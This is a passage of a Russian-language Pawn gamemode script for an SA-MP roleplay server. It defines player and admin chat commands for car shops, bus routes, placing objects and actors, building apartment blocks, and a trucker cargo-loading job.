	if(IsPlayerInRangeOfPoint(playerid,5.0, 562.2836,-1291.9972,17.2482))
	{
		SetPVarInt(playerid,"AutoShop",1);
		SetPVarInt(playerid, "CarShop", 0);//nope
		SetPVarInt(playerid, "SelectAvto", 0);
		return ShowBuyCar(playerid);
	}
	else if(IsPlayerInRangeOfPoint(playerid,5.0, -1951.2544,293.6375,35.4688))
	{
		SetPVarInt(playerid,"AutoShop",2);
		return ShowPlayerDialogEx(playerid,14009,0," ","Выберите класс машин","C","D");
	}
	else if(IsPlayerInRangeOfPoint(playerid,5.0, -1657.7015,1210.2267,7.2500))
	{
		SetPVarInt(playerid,"AutoShop",3);
		return ShowPlayerDialogEx(playerid,14009,0," ","Выберите класс машин","A","B");
	}
	else if(IsPlayerInRangeOfPoint(playerid,5.0, 2200.8857,1394.2892,11.0625))
	{
		SetPVarInt(playerid,"AutoShop",4);
		return ShowPlayerDialogEx(playerid,14009,0," ","Выберите класс машин","A","B");
	}
	else SCM(playerid,-1," Вы не в месте продажи автомобилей!");
	return 1;
}
CMD:setspa(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(PTEMP[playerid][pAdmin] < 6 || dostup[playerid] == 0) return true;
	if(sscanf(params, "ud", params[0],params[1])) return SCM(playerid, -1, " Введите: /setspa [playerid] [значение]");
	SetPlayerSpecialAction (params[0],params[1]);
	printf("Администратор %s установил %s spec.action %i", Name(playerid), Name(params[0]), params[1]);
	return true;
}
CMD:thefskill(playerid)
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	format(YCMDstr,sizeof(YCMDstr), " Ваш опыт Автоугонщика: %i / 1000", PTEMP[playerid][pSkilla]);
	SCM(playerid,COLOR_BLUE,YCMDstr);
	return 1;
}
CMD:route(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(PTEMP[playerid][pJob] != 1) return SCM(playerid, COLOR_GREY, " Вы не водитель автобуса");
	if(GetPlayerState(playerid) != 2) return true;
	new carid = GetPlayerVehicleID(playerid);
	if((carid >= buscar[0] && carid <= buscar[1]) || (carid >= buscar[2] && carid <= buscar[3]) || (carid >= buscar[4] && carid <= buscar[5]) || (carid >= buscar[6] && carid <= buscar[7]))
	{
		if(GetPVarInt(playerid, "TypeBus") > 0)
		{
			ShowPlayerDialogEx(playerid,8128,DIALOG_STYLE_MSGBOX, " ", "Вы уверены что хотите завершить свой рабочий день?!", "Завершить", "Отмена");
			return true;
		}
		if(GetPlayerVehicleID(playerid) >= buscar[0] && GetPlayerVehicleID(playerid) <= buscar[1]) ShowPlayerDialogEx(playerid,1745,DIALOG_STYLE_MSGBOX," ","Начать работу водителя автобуса?", "Да", "Нет");
		else if(GetPlayerVehicleID(playerid) >= buscar[2] && GetPlayerVehicleID(playerid) <= buscar[3]) ShowPlayerDialogEx(playerid,1745,DIALOG_STYLE_MSGBOX," ","Начать работу водителя автобуса?", "Да", "Нет");
		else if(GetPlayerVehicleID(playerid) >= buscar[4] && GetPlayerVehicleID(playerid) <= buscar[5]) ShowPlayerDialogEx(playerid,1745,DIALOG_STYLE_MSGBOX," ","Начать работу водителя автобуса?", "Да", "Нет");
		else ShowPlayerDialogEx(playerid, 163, 2, "Маршрут", "АвтоВокзал LS << >> Автошкола SF\nАвтоВокзал LS << >> АвтоВокзал LV", "Принять", "Отмена");
		printf("Игрок %s начал маршрут водителем автобуса", Name(playerid));
	}
	else SCM(playerid, COLOR_GREY, " Вы должны находиться в автобусе!");
	return true;
}
CMD:amusic(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(PTEMP[playerid][pAdmin] < 6 || dostup[playerid] == 0) return true;
	new nonf;
	if(sscanf(params, "f",nonf)) return SCM(playerid, -1, " Введите: /amusic [радиус 1 - 300 или 0 - выключить] [ссылка]");
	if(nonf == 0)
	{
		Sounds = 0;
		foreach(i)
		{
			StopAudioStreamForPlayer(i); // Stop the audio stream
			UseSound[i] = 0;
		}
		return SCM(playerid, 0xFF0000AA, " Музыка отключена");
	}
	new path[150];
	if(sscanf(params, "ds[150]",params[0],path)) return SCM(playerid, -1, " Введите: /amusic [радиус 1 - 300 или 0 - выключить] [ссылка]");
	if(params[0] < 1 || params[0] > 300) return SCM(playerid, COLOR_GREY," От 1 до 300");
	format(stream, sizeof(stream),"%s",path);
	rads = params[0];
	Sounds = 1;
	new Float:x1,Float:y1,Float:z1;
	GetPlayerPos(playerid,x1,y1,z1);
	streampos[0] = x1;
	streampos[1] = y1;
	streampos[2] = z1;
	foreach(i)
	{
		UseSound[i] = 0;
	}
	SCM(playerid, COLOR_GREEN, " Музыка включена"); //http://radiopotok.ru/f/m3u/station_4.m3u
	printf("Администратор %s добавил музыку в радиус %i [%s]", PTEMP[playerid][pName], params[0], path);
	return 1;
}
CMD:actor(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(PTEMP[playerid][pAdmin] < 5) return true;
	new slot, skinid, Float:hpact, bibl[32], idanim[32], repeat;
	if(sscanf(params, "ddfs[32]s[32]d", slot, skinid, hpact, bibl, idanim, repeat)) return SCM(playerid, -1, " /actor [слот] [скин] {C0C0C0}[хп] [аним.библиотека] [аним.ид] [повторять]");
	if(SlotActor[slot] == 0 || SlotActor[slot] == INVALID_ACTOR_ID)
	{
	    new Float:x1, Float:y1, Float:z1, Float:face, vw;
	    GetPlayerPos(playerid, x1, y1, z1);
		GetPlayerFacingAngle(playerid, face);
		vw = GetPlayerVirtualWorld(playerid);
	    SlotActor[slot] = CreateActor(skinid, x1,y1,z1,face);
	    SetActorVirtualWorld(SlotActor[slot], vw);
		SetActorHealth(SlotActor[slot], hpact);
		ApplyActorAnimation(SlotActor[slot], bibl, idanim,4.1,repeat,0,0,1,0);
		SCM(playerid, -1, " Бот установлен");
		SetPlayerPos(playerid, x1+2, y1, z1);
		printf("Администратор %s добавил бота [%i]", Name(playerid), slot);
	}
	return true;
}
CMD:delactor(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(PTEMP[playerid][pAdmin] < 5) return true;
	if(sscanf(params, "d", params[0])) return SCM(playerid, -1, " Введите: /delactor [слот]");
	if(SlotActor[params[0]] != 0 || SlotActor[params[0]] != INVALID_ACTOR_ID)
	{
	    DestroyActor(SlotActor[params[0]]);
		SlotActor[params[0]] = 0;
		SCM(playerid, -1, " Бот удалён");
		printf("Администратор %s удалил бота [%i]", Name(playerid), params[0]);
	}
	return true;
}
CMD:hbjectid(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(PTEMP[playerid][pAdmin] < 5 || dostup[playerid] == 0) return true;
	if(sscanf(params, "d", params[0])) return SCM(playerid, -1, " Введите: /hbjectid [object slot]");
	if(IsPlayerAttachedObjectSlotUsed(playerid, params[0])) EditAttachedObject(playerid, params[0]);
	return true;
}
CMD:hbject(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(PTEMP[playerid][pAdmin] < 5 || dostup[playerid] == 0) return true;
	new giveplayerids = -1, slot = -1, objectid = -1, bone = -1, Float:oX, Float:oY, Float:oZ, Float:rX, Float:rY, Float:rZ, Float:sX, Float:sY, Float:sZ;
	if(sscanf(params, "uddd", giveplayerids, slot, objectid, bone))return SCM(playerid, -1, " Введите: /hbject [playerid] [слот 0-9] [id объект] [1-18]  [x][y][z]  [rx][ry][rz] [sx][sy][sz]");
	if(sscanf(params, "udddfffffffff", giveplayerids, slot, objectid, bone, oX, oY, oZ, rX, rY, rZ, sX, sY, sZ)) 
	{
	    oX = oY = oZ = rX = rY = rZ = 0; sX = sY = sZ = 1.0;
	}
	if(IsPlayerAttachedObjectSlotUsed(giveplayerids, slot)) return RemovePlayerAttachedObject(giveplayerids, slot), SCM(playerid, -1, "Объект удален");
	SetPlayerAttachedObject(giveplayerids, slot, objectid, bone, oX, oY, oZ, rX, rY, rZ, sX, sY, sZ);
	printf("Администратор %s выдал %s объект %i", Name(playerid), Name(giveplayerids), objectid);
	return true;
}
CMD:getobjectpos(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(PTEMP[playerid][pAdmin] < 5 || dostup[playerid] == 0) return true;
	new Float:x1,Float:y1,Float:z1;
	if(sscanf(params, "d", params[0])) return SCM(playerid, -1, " Введите: /getobjectpos [Слот]");
	GetObjectPos(SlotObject[params[0]],x1,y1,z1);
	format(string, 128, " GetDynamicObjectPos %f,%f,%f",x1,y1,z1);
	SCM(playerid,COLOR_GREY,string);
	printf("Администратор %s получил позицию объекта slot%i", Name(playerid), params[0]);
	return true;
}
CMD:obj(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(PTEMP[playerid][pAdmin] < 6 || dostup[playerid] == 0) return 1;
	if(sscanf(params, "dd", params[0],params[1])) return SCM(playerid, -1, " Введите: /obj [слот] [id объекта]");
	if(SlotObject[params[0]] != 0) return SCM(playerid, COLOR_GREY, " Слот занят!");
	new Float:x1,Float:y1,Float:z1;
	GetPlayerPos(playerid,x1,y1,z1);
	SlotObject[params[0]] = CreateDynamicObject(params[1],x1,y1,z1,0.00,0.00,0.00);
	if(SlotObject[params[0]] != 0) return SCM(playerid, -1, " Объект установлен"), printf("Администратор %s установил объект [ID: %i]", Name(playerid), params[1]);
	else SCM(playerid, COLOR_GREY, " Произошла ошибка при создании объекта");
	return 1;
}
CMD:attach(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(PTEMP[playerid][pAdmin] < 6) return true;
	new objectid, vehicleid, Float:x1, Float:y1, Float:z1, Float:rX, Float:rY, Float:rZ;
	if(sscanf(params, "dddffffff", params[0], objectid, vehicleid, x1, y1, z1, rX, rY, rZ)) return SCM(playerid, -1, " Введите: /attach [слот] [ид объекта] [ид автомобиля] [X] [Y] [Z] [rX] [rY] [rZ]");
	if(SlotAttach[params[0]] != 0) return SCM(playerid, COLOR_GREY, " Слот занят!");
	SlotAttach[params[0]] = CreateObject(objectid, 0.0, 0.0, 10.0, 0.0, 0.0, 0.0);
	AttachObjectToVehicle(SlotAttach[params[0]], vehicleid, x1, y1, z1, rX, rY, rZ);
	SCM(playerid, -1, " Объект установлен");
	printf("Администратор %s прикрепил объект %i к автомобилю %i на слот %i", Name(playerid), objectid, vehicleid, params[0]);
	return 1;
}
CMD:delattach(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(PTEMP[playerid][pAdmin] < 6) return true;
	if(sscanf(params, "d", params[0])) return SCM(playerid, -1, " Введите: /delAttach [слот]");
	if(SlotAttach[params[0]] != 0)
	{
		DestroyObject(SlotAttach[params[0]]);
		SlotAttach[params[0]] = 0;
	}
	printf("Администратор %s удалил объект прикреплённый к автомобилю slot%i", Name(playerid), params[0]);
	return 1;
}
CMD:object(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(PTEMP[playerid][pAdmin] < 6 || dostup[playerid] == 0) return 1;
	new Float:x1,Float:y1,Float:z1, Float:rX, Float:rY, Float: rZ;
	if(sscanf(params, "ddffffff", params[0],params[1], x1, y1, z1, rX, rY, rZ)) return SCM(playerid, -1, " Введите: /object [слот] [id объекта] [X] [Y] [Z] [rX] [rY] [rZ]");
	if(SlotObject[params[0]] != 0) return 1;
	SlotObject[params[0]] = CreateDynamicObject(params[1],x1, y1, z1, rX, rY, rZ);
	if(SlotObject[params[0]] != 0) return SCM(playerid, -1, " Объект установлен");
	else SCM(playerid, COLOR_GREY, " Произошла ошибка при создании объекта");
	printf("Администратор %s установил объект %i", Name(playerid), params[1]);
	return 1;
}
CMD:dobject(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(PTEMP[playerid][pAdmin] < 6 || dostup[playerid] == 0) return 1;
	if(sscanf(params, "d", params[0])) return SCM(playerid, -1, " Введите: /dobject [слот]");
	if(SlotObject[params[0]] != 0)
	{
		DestroyDynamicObject(SlotObject[params[0]]);
		SlotObject[params[0]] = 0;
	}
	printf("Администратор %s удалил объект слот%i", Name(playerid), params[0]);
	return 1;
}
CMD:eobject(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(PTEMP[playerid][pAdmin] < 6 || dostup[playerid] == 0) return 1;
	if(sscanf(params, "d", params[0])) { SelectObject(playerid); } else
	{
		if(SlotObject[params[0]] != 0)
		{
			EditDynamicObject(playerid,SlotObject[params[0]]);
		}
	}
	return 1;
}
CMD:podeezd(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(PTEMP[playerid][pAdmin] < 9 || dostup[playerid] == 0) return true;
	if(sscanf(params, "d", params[0]))return SCM(playerid, -1, " Введите: /podeezd [1-9] [int: 0-1] | 0-bomj podeezd , 1-elite podeezd");
	else if(sscanf(params, "d", params[1]))return SCM(playerid, -1, " Введите: /podeezd [1-9] [int: 0-1] | 0-bomj podeezd , 1-elite podeezd");
	new Float:X,Float:Y,Float:Z;
	if(global[playerid] == 0)
	{
		if(params[0] > 9 || params[0] < 1) return SCM(playerid, -1, "Неверное кол-во этажей");
		mysql_format(DATABASE,QUERY, 128, "INSERT INTO `podezd` (`podEtazi`) VALUES ('%i')",params[0]);
		mysql_function_query(DATABASE,QUERY,false,"","");
		AllPODEZD ++;
		GetPlayerPos(playerid, X,Y,Z);
		new carid = CreateVehicle(560, X,Y,Z, 0.0, 230, 230, 60000);
		PutPlayerInVehicleEx(playerid, carid, 0), Fuell[carid] = 200;
		SetPlayerArmedWeapon(playerid,0);
		PodeezdInfo[AllPODEZD][podEtazi] = params[0];
		PodeezdInfo[AllPODEZD][podInt] = params[1];
		PodeezdInfo[AllPODEZD][pid] = AllPODEZD;
		global[playerid] = 1;
		printf("Администратор %s начал создание подьезда %i", Name(playerid), AllPODEZD);
		SCM(playerid, -1, " Поставьте автомобиль туда, где будет находиться парковочное место и введите /podcrt");
		return true;
	}
	return true;
}
//#3
CMD:addkvarts(playerid)
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(PTEMP[playerid][pAdmin] < 9 || dostup[playerid] == 0) return true;
	if(GetPVarInt(playerid, "podeezd") <= 0) return SCM(playerid,COLOR_GREY," Создать квартиру можно только в подъезде");
	new inter = GetPlayerInterior(playerid), vw = GetPlayerVirtualWorld(playerid), podeezd = GetPVarInt(playerid, "podeezd");
	for(new i = 1; i <= ALLKVARTIRI; i++)
	{
		if(kvartinfo[ALLKVARTIRI][virtmir] == podeezd
		&& kvartinfo[ALLKVARTIRI][kworld] == vw)
		return SCM(playerid, COLOR_GREY, " На этом этаже уже есть квартиры");
	}
	if(inter == 1) // Expensive
	{
		AddKvartira(2269.7959,1667.8560,1084.2469,inter,vw, podeezd);
		AddKvartira(2271.3367,1662.5071,1084.2344,inter,vw, podeezd);
		AddKvartira(2266.0420,1662.5962,1084.2344,inter,vw, podeezd);
		AddKvartira(2271.3372,1652.5176,1084.2344,inter,vw, podeezd);
		AddKvartira(2266.0432,1652.5735,1084.2344,inter,vw, podeezd);
		AddKvartira(2271.3369,1642.1674,1084.2344,inter,vw, podeezd);
		AddKvartira(2266.0454,1642.1913,1084.2344,inter,vw, podeezd);
		AddKvartira(2271.3374,1633.4883,1084.2344,inter,vw, podeezd);
		AddKvartira(2266.0454,1633.4976,1084.2344,inter,vw, podeezd);
		AddKvartira(2269.8108,1627.5787,1084.2469,inter,vw, podeezd);
		printf("Администратор %s добавил квартиры на %i этаж подьезда %i", Name(playerid), vw, podeezd);
	}
	else if(inter == 15) // Cheap
	{
		AddKvartira(2201.0576,-1188.5807,1029.7969,inter,vw, podeezd);
	    AddKvartira(2209.5254,-1187.3658,1029.7969,inter,vw, podeezd);
	    AddKvartira(2209.6096,-1189.9896,1029.7969,inter,vw, podeezd);
	    AddKvartira(2225.5920,-1187.2491,1029.7969,inter,vw, podeezd);
	    AddKvartira(2225.6433,-1189.9564,1029.7969,inter,vw, podeezd);
	    AddKvartira(2239.8442,-1170.6464,1029.7969,inter,vw, podeezd);
	    AddKvartira(2242.5247,-1170.6975,1029.7969,inter,vw, podeezd);
	    AddKvartira(2239.8364,-1159.7601,1029.7969,inter,vw, podeezd);
	    AddKvartira(2242.6294,-1159.6667,1029.7969,inter,vw, podeezd);
	    AddKvartira(2229.3750,-1150.5298,1029.7969,inter,vw, podeezd);
	    printf("Администратор %s добавил квартиры на %i этаж подьезда %i", Name(playerid), vw, podeezd);
	}
	else SCM(playerid, COLOR_GREY, " Вы должны находиться в подьезде!");
 	return true;
}
CMD:kvartira(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	new Float:x, Float:y, Float:z;
	GetPlayerPos(playerid, x, y, z);
	if(PTEMP[playerid][pAdmin] < 9 || dostup[playerid] == 0) return true;
	if(sscanf(params, "d", params[0]))return SCM(playerid, -1, " Введите: /kvartira [цена]");
	if(GetPVarInt(playerid, "podeezd") <= 0) return SCM(playerid,COLOR_GREY," Создать квартиру можно только в подъезде");
	new heh = GetPlayerInterior(playerid);
	AddKvartira(x,y,z,heh,GetPlayerVirtualWorld(playerid), GetPVarInt(playerid, "podeezd"));
	printf("Администратор %s добавил квартиру %i на %i этаж подьезда %i", Name(playerid), ALLKVARTIRI, GetPlayerVirtualWorld(playerid), GetPVarInt(playerid, "podeezd"));
	return true;
}
CMD:podcrt(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	new Float:X,Float:Y,Float:Z,Float:Angle;
	if(PTEMP[playerid][pAdmin] < 9 || dostup[playerid] == 0) return true;
	if(global[playerid] == 1)
	{
		GetVehiclePos(GetPlayerVehicleID(playerid), X,Y,Z);
		GetVehicleZAngle(GetPlayerVehicleID(playerid), Angle);
		DestroyVehicle(GetPlayerVehicleID(playerid));
		PodeezdInfo[AllPODEZD][carX]        =    X;
		PodeezdInfo[AllPODEZD][carY]        =    Y;
		PodeezdInfo[AllPODEZD][carZ]       =   Z;
		PodeezdInfo[AllPODEZD][carC]       =   Angle;
		global[playerid] = 2;
		printf("Администратор %s установил координаты автомобильной парковки подьезда %i", Name(playerid),AllPODEZD);
		SCM(playerid,-1," Встаньте к месту входа подъезда и введите /podcreate");
		return true;
	}
	return true;
}
CMD:podcreate(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	new Float:X,Float:Y,Float:Z;
	if(PTEMP[playerid][pAdmin] < 9 || dostup[playerid] == 0) return true;
	if(global[playerid] == 2)
	{
		global[playerid] = 0;
		GetPlayerPos(playerid, X,Y,Z);
		PodeezdInfo[AllPODEZD][podPicX]        =    X;
		PodeezdInfo[AllPODEZD][podPicY]        =    Y;
		PodeezdInfo[AllPODEZD][podPicZ]        =    Z;
		PodeezdInfo[AllPODEZD][podPic]            =    CreatePickup(1318, 1, X, Y, Z);
		for(new b = 1; b <= PodeezdInfo[AllPODEZD][podEtazi]; b++)
		{
			ALLPODEZD++;
			PodeezdInfo[AllPODEZD][podMir][b]   =   ALLPODEZD;
		}
		format(YCMDstr, 123,"Многоквартирный дом\nНомер подъезда: %i",AllPODEZD);
		printf("Администратор %s полностью создал подьезд %i", Name(playerid), ALLPODEZD);
		CreateDynamic3DTextLabel(YCMDstr,0x0076FCFF,PodeezdInfo[AllPODEZD][podPicX],PodeezdInfo[AllPODEZD][podPicY],PodeezdInfo[AllPODEZD][podPicZ]+1,5.0);
		return SCM(playerid, -1, " Вы успешно создали подъезд!");
	}
	return true;
}
CMD:tload(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(PTEMP[playerid][pJob] != 99)return SCM(playerid,COLOR_GREY, " Вы не Дальнобойщик");
	new maxguz = PTEMP[playerid][pDMgruz];
	if(!IsPlayerConnected(playerid)) return true;
	if(Gruz[playerid] != 0) return true;
	if(GetVehicleTrailer(GetPlayerVehicleID(playerid))) return true;
	if(sscanf(params, "d", params[0])) return SCM(playerid, -1, " Введите: /tload [количество]");
	if(params[0] < 1) return SCM(playerid, COLOR_GREY, " Неверное значение");
	if(IsPlayerInRangeOfPoint(playerid, 10.0, 256.4736,1414.5182,10.7075))
	{
		if(togran[playerid] > gettime()) return SCM(playerid,COLOR_GREY," Извините, мы вас немного задержим, нужно подготовить груз");
		if(params[0] > maxguz)
		{
			format(YCMDstr, sizeof(YCMDstr), " Слишком много товара,ваш максимум: %i т.",maxguz);
			SCM(playerid,COLOR_GREY,YCMDstr);
			return true;
		}
		if(PTEMP[playerid][pCash] < params[0]*Benzbuy[0]) return SCM(playerid, 0x6495EDFF, " У вас нет столько денег!");
		PTEMP[playerid][pCash] -= params[0]*Benzbuy[0];
		PTEMP[playerid][pDgruz] += params[0];
		format(YCMDstr, sizeof(YCMDstr), " Загружено %i груза, на сумму %i вирт", params[0],Benzbuy[0]*params[0]);
		SCM(playerid, 0x50fe96aa, YCMDstr);
		CreateVehicle(584, 249.1628,1420.7445,11.1698,269.4982,1,1, -1);
		DriverJob[playerid] = true;
		Gruz[playerid] = 1;
		bGruz[playerid] = 1;
		if(Benzbuy[0] != 900) Benzbuy[0] += 100;
		Benzbuy[1] -= 100;
		if(Benzbuy[0] == 900) {
			Benzbuy[1] = 200; }
		format(string, sizeof(string), "Нефтезавод №1\nЦена за тонну: %d",Benzbuy[0]);
		Update3DTextLabelText(GasZavod[0],0xFFFF00FF,string);
		format(string, sizeof(string), "Нефтезавод №2\nЦена за тонну: %d",Benzbuy[1]);
		Update3DTextLabelText(GasZavod[1],0xFFFF00FF,string);
		togran[playerid] = gettime()+180;
		return true;
	}
	else if(IsPlayerInRangeOfPoint(playerid, 10.0,-1046.7723,-670.7208,32.3516))
	{
		if(togran[playerid] > gettime()) return SCM(playerid,COLOR_GREY," Извините, мы вас немного задержим, нужно подготовить груз");
		if(params[0] > maxguz)
		{
			format(YCMDstr, sizeof(YCMDstr), " Слишком много товара,ваш максимум: %i т.",maxguz);
			SCM(playerid,COLOR_GREY,YCMDstr);
			return true;
		}
		if(PTEMP[playerid][pCash] < params[0]*Benzbuy[1]) return SCM(playerid, 0x6495EDFF, " У вас нет столько денег!");
		PTEMP[playerid][pCash] -= params[0]*Benzbuy[1];
		PTEMP[playerid][pDgruz] += params[0];
		format(YCMDstr, sizeof(YCMDstr), " Загружено %i груза, на сумму %i вирт", params[0],Benzbuy[1]*params[0]);
		SCM(playerid, 0x50fe96aa, YCMDstr);
		CreateVehicle(584,-1053.0789,-662.7253,32.5968,266.1711,1,1, -1);
		DriverJob[playerid] = true;
		Gruz[playerid] = 1;
		bGruz[playerid] = 1;
		Benzbuy[0] -= 100;
		if(Benzbuy[1] != 900) Benzbuy[1] += 100;
		if(Benzbuy[1] == 900) {
			Benzbuy[0] = 200; }
		format(string, sizeof(string), "Нефтезавод №1\nЦена за тонну: %d",Benzbuy[0]);
		Update3DTextLabelText(GasZavod[0],0xFFFF00FF,string);
		format(string, sizeof(string), "Нефтезавод №2\nЦена за тонну: %d",Benzbuy[1]);
		Update3DTextLabelText(GasZavod[1],0xFFFF00FF,string);
		togran[playerid] = gettime()+180;
		return true;
	}
	else if(IsPlayerInRangeOfPoint(playerid, 10.0,608.7718,847.8765,-43.1532))
	{
		if(togran[playerid] > gettime()) return SCM(playerid,COLOR_GREY," Извините, мы вас немного задержим, нужно подготовить груз");
		if(params[0] > maxguz)
		{
			format(YCMDstr, sizeof(YCMDstr), " Слишком много товара,ваш максимум: %i т.",maxguz);
			SCM(playerid,COLOR_GREY,YCMDstr);
			return true;
		}
		if(PTEMP[playerid][pCash] < params[0]*ugolbuy[0]) return SCM(playerid, 0x6495EDFF, " У вас нет столько денег!");
		PTEMP[playerid][pCash] -= params[0]*ugolbuy[0];
		PTEMP[playerid][pDgruz] += params[0];
		format(YCMDstr, sizeof(YCMDstr), " Загружено %i груза, на сумму %i вирт", params[0],ugolbuy[0]*params[0]);
		SCM(playerid, 0x50fe96aa, YCMDstr);
		CreateVehicle(450,588.2112,844.9619,-42.8014,272.4998,1,1, -1);
		DriverJob[playerid] = true;
		Gruz[playerid] = 2;
		bGruz[playerid] = 2;
		if(ugolbuy[0] != 900) ugolbuy[0] += 100;
		ugolbuy[1] -= 100;
		if(ugolbuy[0] == 900) {
			ugolbuy[1] = 200; }
		format(string, sizeof(string), "Cклад угля №1\nЦена за тонну: %d",ugolbuy[0]);
		Update3DTextLabelText(Sklad[0],0xFFFF00FF,string);
		format(string, sizeof(string), "Cклад угля №2\nЦена за тонну: %d",ugolbuy[1]);
		Update3DTextLabelText(Sklad[1],0xFFFF00FF,string);
		togran[playerid] = gettime()+180;
		return true;
	}
	else if(IsPlayerInRangeOfPoint(playerid, 10.0,-1873.0896,-1720.2430,21.7500))
	{
		if(togran[playerid] > gettime()) return SCM(playerid,COLOR_GREY," Извините, мы вас немного задержим, нужно подготовить груз");
		if(params[0] > maxguz)
		{
			format(YCMDstr, sizeof(YCMDstr), " Слишком много товара,ваш максимум: %i т.",maxguz);
			SCM(playerid,COLOR_GREY,YCMDstr);
			return true;
		}
		if(PTEMP[playerid][pCash] < params[0]*ugolbuy[1]) return SCM(playerid, 0x6495EDFF, " У вас нет столько денег!");
		PTEMP[playerid][pCash] -= params[0]*ugolbuy[1];
		PTEMP[playerid][pDgruz] += params[0];
		format(YCMDstr, sizeof(YCMDstr), " Загружено %i груза, на сумму %i вирт", params[0],ugolbuy[1]*params[0]);
		SCM(playerid, 0x50fe96aa, YCMDstr);
		CreateVehicle(450,-1881.3596,-1689.1852,22.3543,172.1823,1,1, -1);
		DriverJob[playerid] = true;
		Gruz[playerid] = 2;
		bGruz[playerid] = 2;
		ugolbuy[0] -= 100;
		if(ugolbuy[1] != 900) ugolbuy[1] += 100;
		if(ugolbuy[1] == 900) {
			ugolbuy[0] = 200; }
		format(string, sizeof(string), "Cклад угля №1\nЦена за тонну: %d",ugolbuy[0]);
		Update3DTextLabelText(Sklad[0],0xFFFF00FF,string);
		format(string, sizeof(string), "Cклад угля №2\nЦена за тонну: %d",ugolbuy[1]);
		Update3DTextLabelText(Sklad[1],0xFFFF00FF,string);
		togran[playerid] = gettime()+180;
		return true;
	}
	else if(IsPlayerInRangeOfPoint(playerid, 10.0,-449.3336,-65.9115,59.4158))
	{
		if(togran[playerid] > gettime()) return SCM(playerid,COLOR_GREY," Извините, мы вас немного задержим, нужно подготовить груз");
		if(params[0] > maxguz)
		{
			format(YCMDstr, sizeof(YCMDstr), " Слишком много товара,ваш максимум: %i т.",maxguz);
			SCM(playerid,COLOR_GREY,YCMDstr);
			return true;
		}
		if(PTEMP[playerid][pCash] < params[0]*Buyderevo[0]) return SCM(playerid, 0x6495EDFF, " У вас нет столько денег!");
		PTEMP[playerid][pCash] -= params[0]*Buyderevo[0];
		PTEMP[playerid][pDgruz] += params[0];
		format(YCMDstr, sizeof(YCMDstr), " Загружено %i груза, на сумму %i вирт", params[0],Buyderevo[0]*params[0]);
		SCM(playerid, 0x50fe96aa, YCMDstr);
		CreateVehicle(450,-455.8806,-47.2069,60.4907,182.1683,1,1, -1);
		DriverJob[playerid] = true;
		Gruz[playerid] = 3;
		bGruz[playerid] = 3;
		if(Buyderevo[0] != 900) Buyderevo[0] += 100;
		Buyderevo[1] -= 100;
		if(Buyderevo[0] == 900) {
			Buyderevo[1] = 200; }
		format(string, sizeof(string), "Лесопилка №1\nЦена за тонну: %d",Buyderevo[0]);
		Update3DTextLabelText(Derevobuy[0],0xFFFF00FF,string);
		format(string, sizeof(string), "Лесопилка №2\n Цена за тонну: %d",Buyderevo[1]);
		Update3DTextLabelText(Derevobuy[1],0xFFFF00FF,string);
		togran[playerid] = gettime()+180;
		return true;
	}
	else if(IsPlayerInRangeOfPoint(playerid, 10.0,-1978.6846,-2434.8274,30.6250))
	{
		if(togran[playerid] > gettime()) return SCM(playerid,COLOR_GREY," Извините, мы вас немного задержим, нужно подготовить груз");
		if(params[0] > maxguz)
		{
			format(YCMDstr, sizeof(YCMDstr), " Слишком много товара,ваш максимум: %i т.",maxguz);
			SCM(playerid,COLOR_GREY,YCMDstr);
			return true;
		}
		if(PTEMP[playerid][pCash] < params[0]*Buyderevo[1]) return SCM(playerid, 0x6495EDFF, " У вас нет столько денег!");
		PTEMP[playerid][pCash] -= params[0]*Buyderevo[1];
		format(YCMDstr, sizeof(YCMDstr), " Загружено %i груза, на сумму %i вирт", params[0],Buyderevo[0]*params[0]);
		SCM(playerid, 0x50fe96aa, YCMDstr);
		PTEMP[playerid][pDgruz] += params[0];
		CreateVehicle(450,-1966.3121,-2436.0132,31.2080,226.3676,1,1, -1);
		DriverJob[playerid] = true;
		Gruz[playerid] = 3;
		bGruz[playerid] = 3;
		Buyderevo[0] -= 100;
		if(Buyderevo[1] != 900) Buyderevo[1] += 100;
		if(Buyderevo[1] == 900) {
			Buyderevo[0] = 200; }
		format(string, sizeof(string), "Лесопилка №1\nЦена за тонну: %d",Buyderevo[0]);
		Update3DTextLabelText(Derevobuy[0],0xFFFF00FF,string);
		format(string, sizeof(string), "Лесопилка №2\n Цена за тонну: %d",Buyderevo[1]);
		Update3DTextLabelText(Derevobuy[1],0xFFFF00FF,string);
		togran[playerid] = gettime()+180;
		return true;
	}
	else
	{
		SCM(playerid, COLOR_GREY, " Вы не на месте закупки!");
	}
	return true;
}
CMD:tunload(playerid, params[])
{
	peremennn[playerid] = 0;
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(PTEMP[playerid][pJob] != 99)return SCM(playerid,COLOR_GREY, " Вы не Дальнобойщик");
	if(DriverJob[playerid] == false) return SCM(playerid,COLOR_GREY," Вы не загружены");
	if(!IsAtTTPlace(playerid)) return SCM(playerid,0x81DA99AA," Нужно находится в порту");
	switch(bGruz[playerid])
	{
	case 1:
		{
			if(IsPlayerInRangeOfPoint(playerid, 10.0, 2601.7222,-2226.5867,13.3732))
			{
